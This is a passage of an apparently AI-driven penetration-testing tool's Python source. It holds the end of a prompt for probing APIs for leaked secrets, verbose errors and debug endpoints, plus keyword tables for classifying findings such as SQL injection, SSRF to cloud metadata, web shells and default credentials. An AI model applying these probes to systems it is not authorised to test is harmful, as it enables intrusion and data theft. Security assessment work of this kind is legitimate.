        "retrieve other users' PII?\n"
        "3. Sensitive-field probe: scan every JSON response you've collected for "
        "'password', 'hash', 'salt', 'token', 'secret', 'api_key', 'private_key', "
        "'ssn', 'credit_card', 'cvv', 'pin', 'otp'. Any hit = finding.\n"
        "4. Verbose errors: trigger errors (bad JSON, missing fields, bad types) "
        "and capture stack traces, SQL snippets, file paths, hostnames.\n"
        "5. Debug/introspection endpoints: /api/debug, /actuator/*, /graphql "
        "with IntrospectionQuery, /api/swagger, /api/openapi — do they leak internal "
        "schema or config?\n"
        "6. ID enumeration: for every endpoint that takes an id, sweep a small "
        "range (id-5 … id+5) and diff the responses — leaking other users' data is "
        "both BOLA and data exposure.\n"
        "REPORT each leaked sensitive field/endpoint as its own finding with the "
        "offending response body as evidence."
    ),
}
_PHASE_TO_PROMPT_KEY = {
    "web_a01": "access_control", "api_authz": "access_control",
    "web_bfla": "access_control", "api_bfla": "access_control",
    "web_a07": "auth", "api_auth": "auth",
    "web_a03_sqli": "sqli", "api_injection": "sqli",
    "web_a03_xss": "xss",
    "web_a03_cmdi": "injection", "web_a03_ssti": "injection",
    "web_a03_path_traversal": "injection", "web_a03_xxe": "injection",
    "web_a10": "ssrf", "api_ssrf": "ssrf",
    "web_file_upload": "file_upload",
    "web_password_reset": "password_reset",
    "web_session_mgmt": "session_mgmt",
    "api_mass_assign": "mass_assign",
    "api_data_exposure": "data_exposure",
}

_PHASE_CORE_KEYWORDS: dict[str, tuple[str, ...]] = {
    "web_a07": (
        "default credential", "weak password", "credential stuffing",
        "brute force successful", "admin:admin", "login bypass",
        "authentication bypass", "auth bypass", "cracked password",
        "sql injection authentication", "valid credentials",
        "default password", "credentials accepted",
    ),
    "api_auth": (
        "default credential", "weak password", "credential stuffing",
        "brute force successful", "admin:admin", "login bypass",
        "authentication bypass", "auth bypass", "valid credentials",
        "default password", "credentials accepted", "broken token",
        "jwt alg", "jwt none", "missing authentication",
    ),
    "web_a01": (
        "broken access", "access control", "forced browsing", "idor",
        "authorization bypass", "privilege escalation", "admin panel",
        "horizontal escalation", "vertical escalation", "role bypass",
        "method tampering", "parameter pollution",
    ),
    "api_authz": (
        "bola", "broken object level", "idor", "authorization bypass",
        "horizontal escalation", "vertical escalation", "access control",
        "role bypass", "privilege escalation",
    ),
    "web_bfla": (
        "bfla", "broken function level", "function level authorization",
        "privilege escalation", "role bypass", "admin function",
    ),
    "api_bfla": (
        "bfla", "broken function level", "function level authorization",
        "privilege escalation", "role bypass", "admin endpoint",
    ),
    "web_a03_sqli": (
        "sql injection", "sqli", "blind sql", "union-based",
        "boolean-based", "time-based sql", "error-based sql",
    ),
    "web_a03_xss": (
        "xss", "cross-site scripting", "reflected script",
        "stored script", "dom-based xss", "script injection",
    ),
    "web_a03_cmdi": (
        "command injection", "os command", "shell injection",
        "remote code execution", "rce",
    ),
    "web_a03_ssti": (
        "template injection", "ssti", "server-side template",
    ),
    "web_a03_path_traversal": (
        "path traversal", "directory traversal", "lfi",
        "local file inclusion", "arbitrary file read",
    ),
    "web_a03_xxe": (
        "xxe", "xml external entity", "external entity",
    ),
    "api_injection": (
        "sql injection", "sqli", "command injection",
        "xss", "cross-site scripting", "template injection",
        "xxe", "path traversal", "nosql injection", "ldap injection",
    ),
    "web_a10": (
        "ssrf", "server-side request forgery", "internal network",
        "cloud metadata", "169.254.169.254",
    ),
    "api_ssrf": (
        "ssrf", "server-side request forgery", "internal network",
        "cloud metadata", "169.254.169.254",
    ),
    "web_file_upload": (
        "arbitrary file upload", "unrestricted file upload",
        "file upload rce", "remote code execution", "rce via upload",
        "webshell", "web shell", "php shell", "jsp shell",
        "executable upload", "double extension",
    ),
    "web_password_reset": (
        "password reset host header", "host header injection",
        "account takeover", "reset token reuse", "reset token not invalidated",
        "predictable reset token", "account enumeration",
        "password reset poisoning", "missing old password",
    ),
    "web_session_mgmt": (
        "session fixation", "session not invalidated",
        "session token in url", "missing httponly", "missing secure flag",
        "missing samesite", "insecure cookie", "session reuse",
        "long-lived session", "predictable session",
    ),
    "api_mass_assign": (
        "mass assignment", "privilege escalation to admin",
        "role=admin", "isadmin", "price tampering",
        "ownership takeover", "parameter tampering escalation",
        "unauthorized field modification",
    ),
    "api_data_exposure": (
        "excessive data exposure", "sensitive data exposure",
        "pii leak", "password hash in response", "api key in response",
        "secret in response", "verbose error", "stack trace exposed",
        "debug endpoint", "internal id leak", "internal field leak",
        "unfiltered list endpoint",
    ),
}
